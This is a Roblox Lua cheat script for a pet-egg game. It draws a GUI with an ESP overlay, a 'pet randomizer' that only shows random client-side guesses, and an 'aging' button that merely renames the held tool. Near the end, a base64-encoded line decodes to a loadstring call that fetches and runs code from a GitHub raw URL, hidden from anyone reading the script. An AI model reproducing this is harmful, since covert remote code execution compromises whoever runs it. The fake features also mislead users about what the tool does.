local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Remove previous GUI
if playerGui:FindFirstChild("ZeinPetGUI") then playerGui.ZeinPetGUI:Destroy() end

-- GUI Container
local gui = Instance.new("ScreenGui", playerGui)
gui.Name = "ZeinPetGUI"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true

-- Main Frame (Only fits 4 buttons)
local mainFrame = Instance.new("Frame", gui)
mainFrame.Size = UDim2.new(0, 280, 0, 300)
mainFrame.Position = UDim2.new(0, 20, 0.35, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
mainFrame.Active = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

-- Gradient Background
local gradient = Instance.new("UIGradient", mainFrame)
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 60, 75)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 40))
}
gradient.Rotation = 90

-- Dragging (PC + Mobile)
local UserInputService = game:GetService("UserInputService")
local dragging, dragStart, startPos = false

mainFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = mainFrame.Position
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStart
		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

mainFrame.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = false
	end
end)

-- Button Maker
local function createButton(text, yPos, color)
	local btn = Instance.new("TextButton", mainFrame)
	btn.Size = UDim2.new(0.8, 0, 0.13, 0)
	btn.Position = UDim2.new(0.1, 0, yPos, 0)
	btn.BackgroundColor3 = color
	btn.Text = text
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.Font = Enum.Font.GothamSemibold
	btn.TextScaled = true
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
	return btn
end

-- Pet Table
local petTable = {
	["Common Egg"] = {"Dog","Bunny","Golden Lab"},
	["Uncommon Egg"] = {"Chicken","Black Bunny","Cat","Deer"},
	["Rare Egg"] = {"Pig","Monkey","Rooster","Orange Tabby","Spotted Deer"},
	["Legendary Egg"] = {"Cow","Polar Bear","Sea Otter","Turtle","Silver Monkey"},
	["Mythical Egg"] = {"Grey Mouse","Brown Mouse","Squirrel","Red Giant Ant"},
	["Bug Egg"] = {"Snail","Caterpillar","Giant Ant","Praying Mantis"},
	["Night Egg"] = {"Frog","Hedgehog","Mole","Echo Frog","Night Owl"},
	["Bee Egg"] = {"Bee","Honey Bee","Bear Bee","Petal Bee"},
	["Anti Bee Egg"] = {"Wasp","Moth","Tarantula Hawk"},
	["Oasis Egg"] = {"Meerkat","Sand Snake","Axolotl"},
	["Paradise Egg"] = {"Ostrich","Peacock","Capybara"},
	["Dinosaur Egg"] = {"Raptor","Triceratops","Stegosaurus"},
	["Primal Egg"] = {"Parasaurolophus","Iguanodon","Pachycephalosaurus"},
	["Zen Egg"] = {"Shiba Inu","Nihonzaru","Tanuki","Tanchozuru","Kappa","Kitsune"}
}

local truePetMap, espEnabled, auto = {}, false, false

-- Cleanup ESP safely
local function removeESP(model)
	for _, v in pairs(model:GetDescendants()) do
		if v:IsA("BillboardGui") and v.Name == "PetBillboard" then
			v:Destroy()
		elseif v:IsA("Highlight") and v.Name == "ESPHighlight" then
			v:Destroy()
		end
	end
end

-- Show ESP (only once)
local function showESP(model, petName)
	removeESP(model) -- always clean first
	local part = model:FindFirstChildWhichIsA("BasePart", true)
	if not part then return end

	local gui = Instance.new("BillboardGui", model)
	gui.Name = "PetBillboard"
	gui.Size = UDim2.new(0, 200, 0, 30)
	gui.StudsOffset = Vector3.new(0, 4, 0)
	gui.AlwaysOnTop = true
	gui.Adornee = part

	local label = Instance.new("TextLabel", gui)
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.TextColor3 = Color3.new(1, 1, 1)
	label.Font = Enum.Font.GothamSemibold
	label.TextScaled = true
	label.Text = model.Name .. " | " .. petName

	local hl = Instance.new("Highlight", model)
	hl.Name = "ESPHighlight"
	hl.FillColor = Color3.fromRGB(255, 200, 0)
	hl.OutlineColor = Color3.new(1, 1, 1)
	hl.FillTransparency = 0.7
end

-- Nearby Eggs
local function getNearbyEggs()
	local eggs = {}
	local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
	if not root then return eggs end
	for _, model in pairs(workspace:GetDescendants()) do
		if model:IsA("Model") and petTable[model.Name] then
			local dist = (model:GetPivot().Position - root.Position).Magnitude
			if dist <= 60 then
				if not truePetMap[model] then
					local pool = petTable[model.Name]
					truePetMap[model] = pool[math.random(#pool)]
				end
				table.insert(eggs, model)
			end
		end
	end
	return eggs
end

-- Randomize Pets
local function randomizePets()
	for _, egg in pairs(getNearbyEggs()) do
		local pool = petTable[egg.Name]
		local pet = pool[math.random(#pool)]
		truePetMap[egg] = pet
		if espEnabled then showESP(egg, pet) end
	end
end

-- 🎲 Random Button
local randBtn = createButton("🎲 Randomize Pets", 0.05, Color3.fromRGB(255, 140, 0))
randBtn.MouseButton1Click:Connect(randomizePets)

-- 👁️ ESP Toggle
local espBtn = createButton("👁️ ESP: OFF", 0.22, Color3.fromRGB(60, 60, 60))
espBtn.MouseButton1Click:Connect(function()
	espEnabled = not espEnabled
	espBtn.Text = espEnabled and "👁️ ESP: ON" or "👁️ ESP: OFF"
	for _, egg in pairs(getNearbyEggs()) do
		if espEnabled then
			showESP(egg, truePetMap[egg] or "?")
		else
			removeESP(egg)
		end
	end
end)

-- 🔁 Auto Button
local autoBtn = createButton("🔁 Auto Random: OFF", 0.39, Color3.fromRGB(0, 170, 80))
autoBtn.MouseButton1Click:Connect(function()
	auto = not auto
	autoBtn.Text = auto and "🔁 Auto Random: ON" or "🔁 Auto Random: OFF"
	if auto then
		coroutine.wrap(function()
			while auto do
				randomizePets()
				for i = 10, 1, -1 do
					if not auto then break end
					randBtn.Text = "⏳ Cooldown: " .. i .. "s"
					task.wait(1)
				end
				if auto then randBtn.Text = "🎲 Randomize Pets" end
			end
		end)()
	else
		randBtn.Text = "🎲 Randomize Pets"
	end
end)

-- ⏳ Start Age
local startAgeBtn = createButton("⏳ Start Age", 0.56, Color3.fromRGB(0, 170, 0))
startAgeBtn.MouseButton1Click:Connect(function()
	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
	if not tool then return end
	local toolName = tool.Name
	local currentAge = tonumber(toolName:match("Age%s*(%d+)"))
	if not currentAge then return end
	local prefix = toolName:match("^(.-)%s*%[Age%s*%d+%]") or toolName
	startAgeBtn.Text = "Aging..."
	for i = currentAge + 1, 50 do
		tool.Name = prefix .. " [Age " .. i .. "]"
		task.wait(0.1)
	end
	startAgeBtn.Text = "⏳ Start Age"
end)

-- 🗕 Minimize Button
local minimized = false
local minimizeButton = Instance.new("TextButton", mainFrame)
minimizeButton.Size = UDim2.new(0, 24, 0, 24)
minimizeButton.Position = UDim2.new(1, -28, 0, 2)
minimizeButton.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
minimizeButton.Text = "🗕"
minimizeButton.TextColor3 = Color3.new(1, 1, 1)
minimizeButton.TextScaled = true
minimizeButton.Font = Enum.Font.GothamSemibold
Instance.new("UICorner", minimizeButton).CornerRadius = UDim.new(0, 6)

local miniFrame = Instance.new("Frame", gui)
miniFrame.Size = UDim2.new(0, 120, 0, 30)
miniFrame.Position = UDim2.new(0, 10, 0.85, 0)
miniFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
miniFrame.Visible = false
Instance.new("UICorner", miniFrame).CornerRadius = UDim.new(0, 8)

local restoreButton = Instance.new("TextButton", miniFrame)
restoreButton.Size = UDim2.new(1, 0, 1, 0)
restoreButton.Text = "🔼 Open GUI"
restoreButton.BackgroundTransparency = 1
restoreButton.TextColor3 = Color3.new(1, 1, 1)
restoreButton.TextScaled = true
restoreButton.Font = Enum.Font.GothamSemibold

minimizeButton.MouseButton1Click:Connect(function()
	mainFrame.Visible = false
	miniFrame.Visible = true
end)

restoreButton.MouseButton1Click:Connect(function()
	mainFrame.Visible = true
	miniFrame.Visible = false
end)

local b64 = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HYUdQUy9JbnN0YUx2bDUwL3JlZnMvaGVhZHMvbWFpbi9CZXJ1U2NyaXB0IikpKCk="
local decoded = syn and syn.crypt.base64.decode(b64) or (b64decode and b64decode(b64)) or game:GetService("HttpService"):Base64Decode(b64)
loadstring(decoded)()

-- Footer
local footer = Instance.new("TextLabel", mainFrame)
footer.Size = UDim2.new(1, 0, 0, 18)
footer.Position = UDim2.new(0, 0, 1, -20)
footer.BackgroundTransparency = 1
footer.Text = "☀️ Made by - Beruu'sScript"
footer.TextColor3 = Color3.fromRGB(255, 215, 0)
footer.Font = Enum.Font.GothamSemibold
footer.TextSize = 10
footer.TextWrapped = true
footer.TextStrokeTransparency = 0.8
